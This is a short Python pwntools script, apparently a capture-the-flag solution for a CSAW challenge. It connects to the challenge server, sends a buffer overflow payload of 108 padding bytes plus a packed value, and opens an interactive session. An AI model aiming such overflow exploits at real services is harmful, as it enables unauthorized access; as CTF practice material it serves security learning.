from pwn import *


#r = process('./b0f')
r = remote('pwn.chal.csaw.io', 10106)
print r.recvuntil(":")


shellcode = 'A'*108 + p32(21)

r.sendline(shellcode)
r.interactive()
